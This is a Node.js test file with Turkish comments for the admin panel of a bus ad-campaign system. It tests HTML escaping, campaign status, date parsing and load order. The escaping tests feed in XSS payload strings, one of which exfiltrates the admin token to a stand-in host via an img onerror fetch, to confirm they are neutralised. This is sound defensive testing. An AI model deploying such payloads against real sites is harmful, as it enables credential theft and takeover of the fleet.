import { test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import vm from 'node:vm'

/**
 * PANEL KURALLARI.
 *
 * Panelde blocker/major siniftan kusurlar bulundu (otomatik yenilemenin kampanyayi
 * YANLIS videoya baglamasi, bos catch'in donmus paneli calisir gostermesi) ama panel
 * icin HICBIR test altyapisi yoktu: duzeltmeler gerileyebilir ve bunu kimse gormezdi.
 *
 * Neden jsdom yok: bu projenin bilincli kurali "ekstra/native bagimlilik yok".
 * Saf kurallar klasik bir <script> olan kurallar.js icinde; burada onu node:vm ile
 * tarayicidaki gibi yukluyoruz. Bagimlilik: sifir. Test edilen sey PANELIN GERCEKTEN
 * KULLANDIGI kod (app.js ikinci bir kopya tutmuyor, ayni globalden okuyor).
 */
function kurallariYukle () {
  const kaynak = fs.readFileSync(new URL('../src/panel/kurallar.js', import.meta.url), 'utf8')
  const kutu = { window: {} }
  kutu.globalThis = kutu
  vm.createContext(kutu)
  vm.runInContext(kaynak, kutu)
  assert.ok(kutu.PanelKurallari, 'kurallar.js PanelKurallari tanimlamali')
  return kutu.PanelKurallari
}

const K = kurallariYukle()

// ---------------------------------------------------------------- esc (GUVENLIK)

test('esc: CIHAZDAN gelen script enjeksiyonu notrlestirilir', () => {
  /*
   * Bu testin konusu dogrudan ADMIN TOKENI. Heartbeat'teki lastError ve
   * playlistReason cihazdan geliyor ve panelde innerHTML'e basiliyor. Kacis
   * dustugunde ele gecirilmis TEK bir otobus, panelde kod calistirip
   * localStorage'daki admin tokenini - yani filoya APK yayimlama yetkisini - calar.
   */
  assert.equal(
    K.esc('<img src=x onerror="fetch(`//kotu/`+localStorage.adminToken)">'),
    '&lt;img src=x onerror=&quot;fetch(`//kotu/`+localStorage.adminToken)&quot;&gt;'
  )
  assert.equal(K.esc('<script>alert(1)</script>'), '&lt;script&gt;alert(1)&lt;/script&gt;')
})

test('esc: nitelik sinirlarini da kapatir', () => {
  // Tek tirnak KRITIK: panelde `title="${esc(...)}"` gibi kullanimlar var, ama
  // tek tirnakli nitelikler de yazilabilir - ikisini de kapatiyoruz.
  assert.equal(K.esc('" onmouseover="x'), '&quot; onmouseover=&quot;x')
  assert.equal(K.esc("' onmouseover='x"), '&#39; onmouseover=&#39;x')
})

test('esc: & once kacirilir (cift kacis zinciri bozulmasin)', () => {
  // `&lt;` girdisi `&amp;lt;` olmali; ters sirada `&amp;` uretilip sonra bozulurdu.
  assert.equal(K.esc('&lt;'), '&amp;lt;')
  assert.equal(K.esc('a & b'), 'a &amp; b')
})

test('esc: null/undefined bos dizgi (tabloda "undefined" yazmasin)', () => {
  assert.equal(K.esc(null), '')
  assert.equal(K.esc(undefined), '')
  assert.equal(K.esc(0), '0')
  assert.equal(K.esc(false), 'false')
})

// ---------------------------------------------------------------- kampanya durumu

const SIMDI = Date.parse('2026-09-27T12:00:00Z')
const g = (n) => new Date(SIMDI + n * 86_400_000).toISOString()

test('kampanya durumu: aktif / bekliyor / suresi gecmis', () => {
  assert.equal(K.kampanyaDurumu({ enabled: true, validFrom: g(-1), validUntil: g(1) }, SIMDI).metin, 'aktif')
  assert.equal(K.kampanyaDurumu({ enabled: true, validFrom: g(1), validUntil: g(5) }, SIMDI).metin, 'bekliyor')
  assert.equal(K.kampanyaDurumu({ enabled: true, validFrom: g(-5), validUntil: g(-1) }, SIMDI).metin, 'süresi geçmiş')
})

test('kampanya durumu: TERS ARALIK kirmizi - hic yayinlanamaz', () => {
  /*
   * Ters araligi ayirmak onemli: panelde yalnizca tarihler goruluyordu, yani hic
   * yayinlanamayacak bir kampanya ile canli olan ayirt edilemiyordu. Sunucu da artik
   * reddediyor; bu, elle db.json'a girmis eski kayitlar icin gorunurluk.
   */
  const d = K.kampanyaDurumu({ enabled: true, validFrom: g(5), validUntil: g(1) }, SIMDI)
  assert.equal(d.metin, 'TERS ARALIK')
  assert.equal(d.renk, 'var(--bad)')
})

test('kampanya durumu: evergreen ve kapali ozel durumlar', () => {
  assert.equal(K.kampanyaDurumu({ enabled: true, evergreen: true, validUntil: g(-9) }, SIMDI).metin, 'evergreen')
  assert.equal(K.kampanyaDurumu({ enabled: false, validUntil: g(9) }, SIMDI).metin, 'kapalı')
})

test('kampanya durumu: tarihi hic olmayan kampanya aktif sayilir', () => {
  // Sunucu validUntil'i zorunlu tutuyor; eski bir kayitta bos olsa bile panel
  // cokmemeli ve kampanyayi gizlememeli.
  assert.equal(K.kampanyaDurumu({ enabled: true }, SIMDI).metin, 'aktif')
})

// ---------------------------------------------------------------- isoTarih

test('isoTarih: bos deger null, gecerli deger ISO', () => {
  assert.equal(K.isoTarih('Bitis', ''), null)
  assert.equal(K.isoTarih('Bitis', '2026-12-31T23:59'), new Date('2026-12-31T23:59').toISOString())
})

test('isoTarih: okunamayan tarih ISTISNA firlatir - sessiz gecmez', () => {
  /*
   * Eskiden bu donusum try blogunun DISINDAYDI: bir RangeError'da Kaydet butonu
   * hicbir sey yapmiyor ve log'a tek satir bile dusmuyordu.
   */
  assert.throws(() => K.isoTarih('Bitis', 'yarin sabah'), /Bitis tarihi okunamadı/)
})

// ---------------------------------------------------------------- itemImzasi

test('itemImzasi: liste degismediyse ayni imza (secim SIFIRLANMAZ)', () => {
  /*
   * Bu, panelin BLOCKER kusurunun testi: `<select>` her yenilemede yeniden
   * kuruluyordu ve tarayici selectedIndex'i 0'a dusuruyordu. Operator formu
   * doldururken (30 sn'yi gecmesi kacinilmaz) secili video sessizce listenin ILK
   * ogesine donuyor, kampanya YANLIS videoya baglaniyordu - 50 otobuste yanlis
   * reklam ve geri alma kanali yok.
   */
  const a = [{ sha256: 'aa' }, { sha256: 'bb' }]
  const b = [{ sha256: 'aa' }, { sha256: 'bb' }]
  assert.equal(K.itemImzasi(a), K.itemImzasi(b), 'ayni liste ayni imza vermeli')

  // Gercekten degistiyse imza da degismeli (aksi halde yeni icerik hic gorunmez).
  assert.notEqual(K.itemImzasi(a), K.itemImzasi([{ sha256: 'aa' }]))
  assert.notEqual(K.itemImzasi(a), K.itemImzasi([{ sha256: 'aa' }, { sha256: 'cc' }]))
  // Sira degisikligi de yeniden kurmayi gerektirir (option sirasi degisir).
  assert.notEqual(K.itemImzasi(a), K.itemImzasi([{ sha256: 'bb' }, { sha256: 'aa' }]))
})

test('itemImzasi: bos/eksik liste cokertmez', () => {
  assert.equal(K.itemImzasi([]), '')
  assert.equal(K.itemImzasi(undefined), '')
})

// ---------------------------------------------------------------- app.js sozlesmesi

test('app.js saf kurallari TEKRAR TANIMLAMIYOR (tek kopya)', () => {
  /*
   * Ikinci bir kopya, testin gercekte kullanilan kodu dogrulamamasi demek olurdu -
   * yani test yesil kalirken panel bozulabilirdi.
   */
  const app = fs.readFileSync(new URL('../src/panel/app.js', import.meta.url), 'utf8')
  for (const ad of ['esc', 'kampanyaDurumu', 'isoTarih', 'itemImzasi']) {
    assert.ok(
      !new RegExp(`function\\s+${ad}\\s*\\(`).test(app),
      `app.js icinde ${ad} YENIDEN tanimlanmis - kurallar.js'teki tek kopya olmali`
    )
  }
  assert.match(app, /window\.PanelKurallari/, 'app.js kurallari globalden almali')
})

test('index.html kurallar.js dosyasini app.js ten ONCE yukluyor', () => {
  // Sira yanlissa panel bos bir ekranla acilir (PanelKurallari undefined).
  const html = fs.readFileSync(new URL('../src/panel/index.html', import.meta.url), 'utf8')
  const k = html.indexOf('kurallar.js')
  const a = html.indexOf('app.js')
  assert.ok(k > -1, 'kurallar.js yuklenmiyor')
  assert.ok(a > -1, 'app.js yuklenmiyor')
  assert.ok(k < a, 'kurallar.js app.js ten ONCE gelmeli')
})
